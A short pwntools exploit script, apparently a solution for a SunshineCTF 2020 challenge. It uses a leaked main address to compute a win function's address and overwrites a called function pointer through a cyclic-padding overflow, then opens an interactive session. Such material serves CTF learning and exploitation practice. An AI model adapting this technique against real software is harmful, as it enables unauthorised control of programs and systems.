from pwn import *

context.arch = 'amd64'

sh = remote('chal.2020.sunshinectf.org', 30005)
# sh = process('./chall_05')

p1 = "A" * 13
sh.recvline()
sh.sendline(p1)

s = sh.recvline().decode('ascii').split()
main_addr = int(s[-1], 0)
print('main: ', hex(main_addr))
win_addr = main_addr - 0x13
print('win: ', hex(win_addr))

# ► 0x5555555547ea <vuln+68>            call   rdx <0x616161706161616f>
padding = cyclic_find(0x6161616f)
payload = cyclic(padding) + p64(win_addr)
print(len(payload))

# with open('payload', 'w') as f:
#     f.write(p1 + '\n')

# with open('payload', 'ab') as f:
#     f.write(payload)

sh.sendline(payload)
sh.interactive()
